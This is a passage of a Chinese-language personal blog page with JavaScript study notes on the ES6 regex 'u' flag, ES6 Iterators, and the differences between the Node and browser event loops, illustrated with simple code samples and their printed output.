<p>其实我第一次做上面这个的时候，我写了第一个是true，第二个false。。。我把<code>u</code>这个意思理解错了。。后来我看了解释，它是这样说的：上面代码中，<code>\uD83D\uDC2A</code>是一个四个字节的 UTF-16 编码，代表一个字符。但是，ES5 不支持四个字节的 UTF-16 编码，会将其识别为两个字符，导致第二行代码结果为<code>true</code>。加了u修饰符以后，ES6 就会识别其为一个字符，所以第一行代码结果为<code>false</code>。<br>一旦加上<code>u</code>修饰符号，就会修改下面这些正则表达式行为。  </p>
<ol>
<li>点(.)字符在正则表达式中，含义是除了换行符以外的任意单个字符。对于码点大于<code>0xFFFF</code>的Unicode字符，点字符不能识别，必须加上<code>u</code>修饰符。</li>
<li>Unicode 字符表示法：ES6 新增了使用大括号表示Unicode字符，这种表示法在正则表达式中必须加上<code>u</code>修饰符，才能识别当中的大括号，否则会被解读为量词。</li>
<li>量词:使用<code>u</code>修饰符后，所有量词都会正确识别码点大于<code>0xFFFF</code>的Unicode字符：<br>/a{2}/.test(‘aa’) // true<br>/a{2}/u.test(‘aa’) // true<br>/𠮷{2}/.test(‘𠮷𠮷’) // false<br>/𠮷{2}/u.test(‘𠮷𠮷’) // true  </li>
</ol>
</blockquote>
<p>4.i 修饰符：有些 Unicode 字符的编码不同，但是字型很相近，比如，\u004B与\u212A都是大写的K.<br>/[a-z]/i.test(‘\u212A’) // false<br>/[a-z]/iu.test(‘\u212A’) // true<br>上面代码中，不加u修饰符，就无法识别非规范的K字符。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/16/ES6的Iterator/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/16/ES6的Iterator/" itemprop="url">ES6的Iterator</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-16T21:53:16+08:00">
                2018-10-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="最近在看es6嘛，然后就很好奇Iterator，然后就跳去看这个遍历的东西了……"><a href="#最近在看es6嘛，然后就很好奇Iterator，然后就跳去看这个遍历的东西了……" class="headerlink" title="最近在看es6嘛，然后就很好奇Iterator，然后就跳去看这个遍历的东西了……"></a>最近在看es6嘛，然后就很好奇Iterator，然后就跳去看这个遍历的东西了……</h4><blockquote>
<p>Iterator 的作用有三个：一是为各种数据结构提供一个统一的、简便的访问接口；而是使得数据结构的成员能够按某种次序排列；三是ES6创造一个新的遍历命令for…of循环，Iterator接口主要供for…of消费。</p>
</blockquote>
<h5 id="Iterator的遍历过程是这样的："><a href="#Iterator的遍历过程是这样的：" class="headerlink" title="Iterator的遍历过程是这样的："></a>Iterator的遍历过程是这样的：</h5><p>(1) 创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。<br><br>(2) 第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员。<br><br>(3) 第二次调用指针对象的next方法，指针就指向数据结构的第二个成员。<br><br>(4) 不断调用指针对象的next方法，直到它指向数据结构的结束位置。<br><br><br>每一次调用<code>next</code>方法，都会返回数据结构的当前成员的信息。具体来说，就是返回一个包含<code>value</code>和<code>done</code>两个属性的对象。其中，<code>value</code>属性是当前成员的值，<code>done</code>属性是一个布尔值，表示遍历是否结束。</p>
<h5 id="总之，调用指针对象的next方法，就可以遍历事先给定的数据结构。"><a href="#总之，调用指针对象的next方法，就可以遍历事先给定的数据结构。" class="headerlink" title="总之，调用指针对象的next方法，就可以遍历事先给定的数据结构。"></a>总之，调用指针对象的next方法，就可以遍历事先给定的数据结构。</h5><h5 id="对于遍历器来说，done-false和value-undefined属性都是可以省略的，例如："><a href="#对于遍历器来说，done-false和value-undefined属性都是可以省略的，例如：" class="headerlink" title="对于遍历器来说，done:false和value: undefined属性都是可以省略的，例如："></a>对于遍历器来说，<code>done:false</code>和<code>value: undefined</code>属性都是可以省略的，例如：</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeIterator</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nextIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      next: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> nextIndex &lt; array.length ? &#123;<span class="attr">value</span>: array[nextIndex++]&#125; : &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> it = makeIterator([<span class="string">'a'</span>, <span class="string">'b'</span>]);</span><br><span class="line"></span><br><span class="line">it.next(); <span class="comment">// &#123;value: 'a', done: false&#125;</span></span><br><span class="line">it.next(); <span class="comment">// &#123;value: 'b', done: false&#125;</span></span><br><span class="line">it.next(); <span class="comment">// &#123;value: undefined, done: true&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeIterator</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nextIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        next: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex &lt; array.length ? </span><br><span class="line">              &#123;<span class="attr">value</span>: array[nextIndex++], <span class="attr">done</span>: <span class="literal">false</span>&#125; : &#123;</span><br><span class="line">                  value: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="原生具备Iterator接口的数据结构如下："><a href="#原生具备Iterator接口的数据结构如下：" class="headerlink" title="原生具备Iterator接口的数据结构如下："></a>原生具备Iterator接口的数据结构如下：</h4><p>1.Array 2.Map 3.Set 4.String 5.TypeArray 6.函数的arguments对象 7.NodeList对象</p>
<h4 id="下面的例子就是数组的Symbol-iterator属性"><a href="#下面的例子就是数组的Symbol-iterator属性" class="headerlink" title="下面的例子就是数组的Symbol.iterator属性"></a>下面的例子就是数组的Symbol.iterator属性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">let</span> iter = arr[<span class="built_in">Symbol</span>.iterator]();</span><br><span class="line"></span><br><span class="line">iter.next(); <span class="comment">// &#123;value: 'a', done: false &#125;</span></span><br><span class="line">iter.next(); <span class="comment">// &#123;value: 'b', done: false &#125;</span></span><br><span class="line">iter.next(); <span class="comment">// &#123;value: 'c', done: false &#125;</span></span><br><span class="line">iter.next(); <span class="comment">// &#123;value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>变量arr是一个数组，原生就具有遍历器接口，部署在<code>arr</code>的<code>Symbol.iterato</code>属性上谜案。所以，调用这个属性，就得到遍历器对象。<br>对于原生部署Iterator接口的数据结构，不用自己写遍历器生成函数，for..of循环会自动遍历它们。除此之外，其他数据结构（主要是对象）的Iterator接口，都需要自己在Symbol。iterator属性上面部署，这样才会被for..of循环遍历。<br></p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RangeIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(start, stop) &#123;</span><br><span class="line">        <span class="keyword">this</span>.value = start;</span><br><span class="line">        <span class="keyword">this</span>.stop = stop;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    [<span class="built_in">Symbol</span>.iterator]() &#123; <span class="keyword">return</span> <span class="keyword">this</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    next() &#123;</span><br><span class="line">        <span class="keyword">var</span> value = <span class="keyword">this</span>.value;</span><br><span class="line">        <span class="keyword">if</span>(value &lt; <span class="keyword">this</span>.stop) &#123;</span><br><span class="line">            <span class="keyword">this</span>.value++;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">done</span>: flase, <span class="attr">value</span>: value&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>:<span class="literal">true</span>, <span class="attr">value</span>: <span class="literal">undefined</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">range</span>(<span class="params">start,stop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> RangeIterator(start, stop);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> value <span class="keyword">of</span> range(o,<span class="number">3</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value); <span class="comment">// 0,1,2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码是一个类部署Iterator接口的写法，Symbol.iterator属性对应一个函数，执行后返回当前对象的遍历器对象。</p>
<h4 id="调用Iterator接口的场合"><a href="#调用Iterator接口的场合" class="headerlink" title="调用Iterator接口的场合"></a>调用Iterator接口的场合</h4><blockquote>
<p>有一些场合会默认调用Iterator接口（即Symbol.iterator方法），除了下文会介绍的for…of循环，还有几个别的场合。<br></p>
</blockquote>
<h5 id="1-解构赋值"><a href="#1-解构赋值" class="headerlink" title="1.解构赋值"></a>1.解构赋值</h5><p>对数组和Set结构进行解构赋值时，会默认调用Symbol.iterator方法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>().add(<span class="string">'a'</span>).add(<span class="string">'b'</span>).add(<span class="string">'c'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x,y] = set;</span><br><span class="line"><span class="comment">// x='a';y='b'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [first, ...rest] = set</span><br><span class="line"><span class="comment">//first='a', rest=['b','c'];</span></span><br></pre></td></tr></table></figure></p>
<h5 id="2-扩展运算符"><a href="#2-扩展运算符" class="headerlink" title="2.扩展运算符"></a>2.扩展运算符</h5><p>扩展运算符(…)也会调用默认的Iterator接口。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'hello'</span>;</span><br><span class="line">[...str] <span class="comment">// ['h', 'e', 'l', 'l', 'o']</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line">[<span class="string">'a'</span>,...arr,<span class="string">'d'</span>] <span class="comment">// ['a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure></p>
<p>上面的代码扩展运算符内部就调用Iterator接口。<br><br>实际上，这提供了一种简便机制，可以将任何部署了Iterator接口的数据结构，转为数组。也就是说，只要某个数据结构部署了Iterator接口，就可以对它使用扩展运算符，将其转为数组。</p>
<h5 id="3-yield"><a href="#3-yield" class="headerlink" title="3.yield*"></a>3.yield*</h5><blockquote>
<p><code>yield*</code>后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> generator = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">yield</span>* [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">5</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> iterator = generator();</span><br><span class="line"></span><br><span class="line">iterator.next() <span class="comment">// &#123; value: 1, done: false &#125;</span></span><br><span class="line">iterator.next() <span class="comment">// &#123; value: 2, done: false &#125;</span></span><br><span class="line">iterator.next() <span class="comment">// &#123; value: 3, done: false &#125;</span></span><br><span class="line">iterator.next() <span class="comment">// &#123; value: 4, done: false &#125;</span></span><br><span class="line">iterator.next() <span class="comment">// &#123; value: 5, done: false &#125;</span></span><br><span class="line">iterator.next() <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="4-其他场合"><a href="#4-其他场合" class="headerlink" title="4.其他场合"></a>4.其他场合</h5><p>由于数组的遍历会调用遍历器接口，所以任何接受数组作为参数的场合，其实都调用了遍历器接口。下面是一些例子。<br></p>
<ul>
<li>for…of</li>
<li>Array.from()</li>
<li>Map(), Set(), WeakMap(), WeakSet()（比如new Map([[‘a’,1],[‘b’,2]])）</li>
<li>Promise.all()</li>
<li>Promise.race()</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/15/补充Event-Loop的Node和浏览器的区别/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/15/补充Event-Loop的Node和浏览器的区别/" itemprop="url">补充Event-Loop的Node和浏览器的区别</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-15T19:40:31+08:00">
                2018-10-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="今天看了菠萝的博客，我才发现原来Node的Event-Loop跟js本身的不一样，我还以为是一样的。。我就说为什么代码运行起来跟我之前学的有差别。。-捂脸"><a href="#今天看了菠萝的博客，我才发现原来Node的Event-Loop跟js本身的不一样，我还以为是一样的。。我就说为什么代码运行起来跟我之前学的有差别。。-捂脸" class="headerlink" title="今天看了菠萝的博客，我才发现原来Node的Event-Loop跟js本身的不一样，我还以为是一样的。。我就说为什么代码运行起来跟我之前学的有差别。。(捂脸)"></a>今天看了菠萝的博客，我才发现原来Node的Event-Loop跟js本身的不一样，我还以为是一样的。。我就说为什么代码运行起来跟我之前学的有差别。。(捂脸)</h4><blockquote>
<p>就拿两段代码来说一下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sleep = <span class="function">(<span class="params">time</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> startTime = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">new</span> <span class="built_in">Date</span>() - startTime &lt; time) &#123; &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'1s over'</span>)</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'setTimeout - 1'</span>)</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout - 1 - 1'</span>)</span><br><span class="line">    sleep(<span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout - 1 - then'</span>)</span><br><span class="line">    <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'setTimeout - 1 - then - then'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  sleep(<span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'setTimeout - 2'</span>)</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout - 2 - 1'</span>)</span><br><span class="line">    sleep(<span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout - 2 - then'</span>)</span><br><span class="line">    <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'setTimeout - 2 - then - then'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  sleep(<span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>这段代码在浏览器的结果是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setTimeout - <span class="number">1</span></span><br><span class="line"><span class="number">1</span>s over</span><br><span class="line">setTimeout - <span class="number">1</span> - then</span><br><span class="line">setTimeout - <span class="number">1</span> - then - then</span><br><span class="line">setTimeout - <span class="number">2</span></span><br><span class="line"><span class="number">1</span>s over</span><br><span class="line">setTimeout - <span class="number">2</span> - then</span><br><span class="line">setTimeout - <span class="number">2</span> - then - then</span><br><span class="line">setTimeout - <span class="number">1</span> - <span class="number">1</span></span><br><span class="line"><span class="number">1</span>s over</span><br><span class="line">setTimeout - <span class="number">2</span> - <span class="number">1</span></span><br><span class="line"><span class="number">1</span>s over</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>在Node里面的执行结果是:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setTimeout - <span class="number">1</span></span><br><span class="line"><span class="number">1</span>s over</span><br><span class="line">setTimeout - <span class="number">2</span></span><br><span class="line"><span class="number">1</span>s over</span><br><span class="line">setTimeout - <span class="number">1</span> - then</span><br><span class="line">setTimeout - <span class="number">2</span> - then</span><br><span class="line">setTimeout - <span class="number">1</span> - then - then</span><br><span class="line">setTimeout - <span class="number">2</span> - then - then</span><br><span class="line">setTimeout - <span class="number">1</span> - <span class="number">1</span></span><br><span class="line"><span class="number">1</span>s over</span><br><span class="line">setTimeout - <span class="number">2</span> - <span class="number">1</span></span><br><span class="line"><span class="number">1</span>s over</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>好的，这是一个，来看下一个：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'1'</span>);</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2'</span>);</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'3'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'4'</span>);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'5'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'6'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'7'</span>);</span><br><span class="line">    resolve();</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'8'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'9'</span>);</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'10'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'11'</span>);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'12'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>这个在浏览器的结果是:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>，<span class="number">7</span>，<span class="number">6</span>，<span class="number">8</span>，<span class="number">2</span>，<span class="number">4</span>，<span class="number">3</span>，<span class="number">5</span>，<span class="number">9</span>，<span class="number">11</span>，<span class="number">10</span>，<span class="number">12</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>在node输出的结果是：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">12</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<h4 id="科普一下Node事件循环的流程"><a href="#科普一下Node事件循环的流程" class="headerlink" title="科普一下Node事件循环的流程:"></a>科普一下Node事件循环的流程:</h4><blockquote>
<p>timers：这个环节里面执行的是和定时器相关的函数，如 setTimeout<br>I/O callbacks：这个环节里面执行的是和 IO 读写相关的操作，如 fs.readFile<br>poll：检查上面两步是否已经完成<br>check：执行 Node 特有的 setImmediate<br>(以上四个都是按顺序的！)<br>所以是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">microTasks =&gt; <span class="function"><span class="params">timer</span> =&gt;</span> microTasks =&gt; I/<span class="function"><span class="params">O</span> =&gt;</span> microTasks =&gt; check </span><br><span class="line">process.nextTick/<span class="function"><span class="params">Promise</span> =&gt;</span> setTimeout =&gt; process.nextTick/<span class="function"><span class="params">Promise</span> =&gt;</span></span><br><span class="line">fs.readFile =&gt; process.nextTick/<span class="function"><span class="params">Promise</span> =&gt;</span> setImmediate</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>在每个阶段开始前，会清空一次 microTasks 中的任务，注意！这就是浏览器和Node事件循环的不同。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote>
<p>在浏览器中，每执行一个 macro-task，就会将当前的 micro-task 清空<br>在 Node 中，每一个阶段开始前，就会将当前的 micro-task 清空，这个阶段可能不止一个 macro-task</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

